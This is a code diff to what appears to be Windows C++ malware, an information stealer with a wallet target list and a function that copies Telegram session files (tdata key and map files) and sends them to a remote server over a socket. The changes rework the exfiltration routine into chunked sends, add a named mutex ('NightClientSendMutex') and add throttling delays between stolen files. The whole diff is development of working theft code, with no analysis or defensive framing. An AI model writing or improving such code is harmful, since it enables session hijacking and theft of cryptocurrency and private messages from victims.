@@ -19,6 +19,7 @@
 #include <iomanip>
 #include <ctime>
 #include <cctype>
+#include <thread>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -57,6 +58,9 @@ static std::vector<WalletMetadata> target_wallets = {
 void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
     if (sock == INVALID_SOCKET) return;
 
+    HANDLE hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "NightClientSendMutex");
+    if (hMutex) WaitForSingleObject(hMutex, INFINITE);
+
     uint32_t pathLen = (uint32_t)relPath.size();
     uint32_t dataSize = (uint32_t)data.size();
     uint32_t totalSize = sizeof(uint32_t) + pathLen + dataSize;
@@ -66,26 +70,26 @@ void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vec
     header.type = PACKET_TYPE_RECOVERY_FILE;
     header.size = totalSize;
 
-    std::vector<uint8_t> packet;
-    packet.resize(sizeof(PacketHeader) + totalSize);
-    memcpy(packet.data(), &header, sizeof(PacketHeader));
+    // Send Header
+    send(sock, (const char*)&header, sizeof(PacketHeader), 0);
+    // Send Path Length
+    send(sock, (const char*)&pathLen, sizeof(uint32_t), 0);
+    // Send Path
+    send(sock, relPath.c_str(), pathLen, 0);
 
-    uint8_t* ptr = packet.data() + sizeof(PacketHeader);
-    memcpy(ptr, &pathLen, sizeof(uint32_t));
-    ptr += sizeof(uint32_t);
-    memcpy(ptr, relPath.c_str(), pathLen);
-    ptr += pathLen;
-    if (dataSize > 0) {
-        memcpy(ptr, data.data(), dataSize);
+    // Send Data in 64KB chunks
+    const size_t CHUNK_SIZE = 64 * 1024;
+    size_t sent_data = 0;
+    while (sent_data < data.size()) {
+        size_t to_send = (data.size() - sent_data > CHUNK_SIZE) ? CHUNK_SIZE : (data.size() - sent_data);
+        int res = send(sock, (const char*)data.data() + sent_data, (int)to_send, 0);
+        if (res <= 0) break;
+        sent_data += res;
     }
 
-    int remaining = (int)packet.size();
-    const char* p = (const char*)packet.data();
-    while (remaining > 0) {
-        int sent = send(sock, p, remaining, 0);
-        if (sent <= 0) break;
-        p += sent;
-        remaining -= sent;
+    if (hMutex) {
+        ReleaseMutex(hMutex);
+        CloseHandle(hMutex);
     }
 }
 
@@ -101,6 +105,7 @@ void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const s
                 std::string rel = fs::relative(entry.path(), source_dir).string();
                 std::replace(rel.begin(), rel.end(), '\\', '/');
                 send_file_to_server(sock, server_path_prefix + "/" + rel, data);
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
             }
         }
     }
@@ -1127,6 +1132,7 @@ void extract_telegram_session(SOCKET sock) {
         if (fs::exists(src)) {
             std::ifstream ifs(src, std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
             send_file_to_server(sock, "telegram session/tdata/" + src.filename().string(), data);
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
     };
     for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) send_tdata_file(tdata_path / f);
@@ -1140,6 +1146,7 @@ void extract_telegram_session(SOCKET sock) {
                         if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
                             std::ifstream ifs(sub_entry.path(), std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                             send_file_to_server(sock, "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string(), data);
+                            std::this_thread::sleep_for(std::chrono::milliseconds(10));
                         }
                     }
                 }
